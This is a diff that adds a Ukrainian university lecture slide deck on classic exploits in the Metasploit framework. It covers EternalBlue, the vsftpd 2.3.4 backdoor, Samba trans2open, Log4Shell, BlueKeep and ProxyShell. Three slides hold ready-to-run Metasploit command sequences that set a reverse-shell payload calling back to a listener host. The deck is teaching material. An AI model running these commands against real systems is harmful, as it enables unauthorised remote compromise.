@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 5.7 — Фреймворк Metasploit та експлуатація</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="5">
+  <div class="slide-deck">
+
+    <!-- Slide 1: Title -->
+    <section class="slide active title-slide">
+      <h1>Класичні експлойти та кейси</h1>
+      <div class="subtitle">Тема 5.7 — Фреймворк Metasploit та експлуатація</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <!-- Slide 2: EternalBlue (MS17-010) -->
+    <section class="slide">
+      <h2>EternalBlue (MS17-010)</h2>
+
+      <div class="card-red">
+        <h3>CVE-2017-0144 — найвідоміший експлойт останнього десятиліття</h3>
+        <ul>
+          <li><strong>CVSS 9.8</strong> (критична вразливість)</li>
+          <li><strong>Протокол:</strong> SMBv1 (Server Message Block версія 1)</li>
+          <li><strong>Вразливі системи:</strong> Windows XP, 7, 8.1, Server 2003–2008 R2</li>
+          <li><strong>Тип:</strong> віддалене виконання коду без автентифікації</li>
+          <li><strong>Використано в:</strong> WannaCry (травень 2017), NotPetya (червень 2017)</li>
+          <li><strong>Витік:</strong> NSA (Shadow Brokers, квітень 2017)</li>
+        </ul>
+      </div>
+
+      <div class="code-block">
+        <pre><code><span class="code-comment"># Експлуатація EternalBlue в Metasploit</span>
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.0.0.1
+exploit</code></pre>
+      </div>
+
+      <div class="info-box">
+        <strong>Реальний вплив WannaCry:</strong> 230,000+ заражених комп'ютерів у 150+ країнах за перший день (12 травня 2017). Збитки оцінюються в $4+ млрд. Постраждали: NHS (британська система охорони здоров'я), FedEx, Renault, Deutsche Bahn.
+      </div>
+    </section>
+
+    <!-- Slide 3: vsftpd 2.3.4 and Samba -->
+    <section class="slide">
+      <h2>vsftpd 2.3.4 та Samba</h2>
+
+      <div class="two-column">
+        <div>
+          <div class="card-blue">
+            <h3>vsftpd 2.3.4 Backdoor</h3>
+            <ul>
+              <li><strong>CVE-2011-2523</strong> (бекдор у вихідному коді)</li>
+              <li><strong>Тригер:</strong> логін з символом <code>:)</code> (смайлик)</li>
+              <li><strong>Результат:</strong> root shell на порту 6200</li>
+              <li><strong>Період:</strong> лютий 2011 (вихідний код компрометовано)</li>
+              <li><strong>Виявлення:</strong> липень 2011</li>
+            </ul>
+          </div>
+
+          <div class="code-block">
+            <pre><code><span class="code-comment"># Експлуатація vsftpd 2.3.4</span>
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.1.50
+set RPORT 21
+exploit
+
+<span class="code-comment"># Отримуємо root shell на порту 6200</span></code></pre>
+          </div>
+        </div>
+
+        <div>
+          <div class="card-green">
+            <h3>Samba trans2open</h3>
+            <ul>
+              <li><strong>CVE-2003-0201</strong></li>
+              <li><strong>Тип:</strong> переповнення буфера</li>
+              <li><strong>Вразливі версії:</strong> Samba &lt; 2.2.8a</li>
+              <li><strong>Вплив:</strong> віддалене виконання коду з правами root</li>
+              <li><strong>Платформи:</strong> Linux, BSD, Solaris</li>
+            </ul>
+          </div>
+
+          <div class="code-block">
+            <pre><code><span class="code-comment"># Експлуатація Samba trans2open</span>
+use exploit/linux/samba/trans2open
+set RHOSTS 192.168.1.60
+set PAYLOAD linux/x86/shell_reverse_tcp
+set LHOST 10.0.0.1
+exploit</code></pre>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 4: Log4Shell and Modern Exploits -->
+    <section class="slide">
+      <h2>Log4Shell та інші сучасні експлойти</h2>
+
+      <div class="card-red">
+        <h3>Log4Shell (CVE-2021-44228)</h3>
+        <ul>
+          <li><strong>CVSS 10.0</strong> (максимальна критичність)</li>
+          <li><strong>Компонент:</strong> Apache Log4j 2.x (версії 2.0-beta9 до 2.14.1)</li>
+          <li><strong>Тип:</strong> JNDI Injection → віддалене виконання коду</li>
+          <li><strong>Вплив:</strong> мільйони Java-додатків (Minecraft, VMware, Apple iCloud, Tesla)</li>
+          <li><strong>Виявлено:</strong> грудень 2021 (Alibaba Cloud Security Team)</li>
+          <li><strong>MSF модуль:</strong> <code>exploit/multi/http/log4shell_header_injection</code></li>
+        </ul>
+      </div>
+
+      <div class="two-column">
+        <div>
+          <div class="card-purple">
+            <h3>BlueKeep (CVE-2019-0708)</h3>
+            <ul>
+              <li><strong>CVSS 9.8</strong></li>
+              <li><strong>Протокол:</strong> RDP (Remote Desktop Protocol)</li>
+              <li><strong>Тип:</strong> RCE без автентифікації (pre-auth)</li>
+              <li><strong>Вразливі системи:</strong> Windows 7, Server 2008/2008 R2, XP</li>
+              <li><strong>Потенціал:</strong> самопоширення (wormable)</li>
+              <li><strong>MSF:</strong> <code>exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code></li>
+            </ul>
+          </div>
+        </div>
+
+        <div>
+          <div class="card-yellow">
+            <h3>ProxyShell (Exchange)</h3>
+            <ul>
+              <li><strong>CVE-2021-34473</strong> (SSRF)</li>
+              <li><strong>CVE-2021-34523</strong> (Privilege Escalation)</li>
+              <li><strong>CVE-2021-31207</strong> (RCE)</li>
+              <li><strong>Ланцюг атаки:</strong> SSRF → підвищення привілеїв → виконання коду</li>
+              <li><strong>Цілі:</strong> Microsoft Exchange Server 2013–2019</li>
+              <li><strong>Використано:</strong> для розгортання ransomware (LockFile, Conti)</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 5: Comparison Table and Summary -->
+    <section class="slide">
+      <h2>Порівняльна таблиця експлойтів</h2>
+
+      <table class="comparison-table">
+        <thead>
+          <tr>
+            <th>Назва</th>
+            <th>CVE</th>
+            <th>CVSS</th>
+            <th>Сервіс/Протокол</th>
+            <th>Вплив</th>
+            <th>MSF модуль</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="cell-red"><strong>EternalBlue</strong></td>
+            <td>CVE-2017-0144</td>
+            <td class="cell-red">9.8</td>
+            <td>SMBv1</td>
+            <td>WannaCry, NotPetya</td>
+            <td>exploit/windows/smb/ms17_010_eternalblue</td>
+          </tr>
+          <tr>
+            <td class="cell-blue"><strong>vsftpd 2.3.4</strong></td>
+            <td>CVE-2011-2523</td>
+            <td class="cell-yellow">8.0</td>
+            <td>FTP</td>
+            <td>Бекдор у коді</td>
+            <td>exploit/unix/ftp/vsftpd_234_backdoor</td>
+          </tr>
+          <tr>
+            <td class="cell-green"><strong>Samba trans2open</strong></td>
+            <td>CVE-2003-0201</td>
+            <td class="cell-red">9.0</td>
+            <td>SMB/CIFS</td>
+            <td>Buffer overflow</td>
+            <td>exploit/linux/samba/trans2open</td>
+          </tr>
+          <tr>
+            <td class="cell-red"><strong>Log4Shell</strong></td>
+            <td>CVE-2021-44228</td>
+            <td class="cell-red">10.0</td>
+            <td>Apache Log4j</td>
+            <td>Мільйони Java-додатків</td>
+            <td>exploit/multi/http/log4shell_header_injection</td>
+          </tr>
+          <tr>
+            <td class="cell-purple"><strong>BlueKeep</strong></td>
+            <td>CVE-2019-0708</td>
+            <td class="cell-red">9.8</td>
+            <td>RDP</td>
+            <td>Wormable RCE</td>
+            <td>exploit/windows/rdp/cve_2019_0708_bluekeep_rce</td>
+          </tr>
+          <tr>
+            <td class="cell-yellow"><strong>ProxyShell</strong></td>
+            <td>3 CVE (ланцюг)</td>
+            <td class="cell-red">9.8</td>
+            <td>Exchange</td>
+            <td>Ransomware-кампанії</td>
+            <td>exploit/windows/http/exchange_proxyshell_rce</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="success-box">
+        <strong>Чому вивчати класичні експлойти?</strong> Розуміння принципів старих вразливостей дозволяє передбачати нові. EternalBlue використовував переповнення буфера — цей самий клас вразливості існує з 1980-х і досі актуальний. Log4Shell показав, як одна логічна помилка в популярній бібліотеці може поставити під загрозу мільйони систем. Вивчення кейсів — це аналіз шаблонів, а не просто запам'ятовування CVE-номерів.
+      </div>
+    </section>
+
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
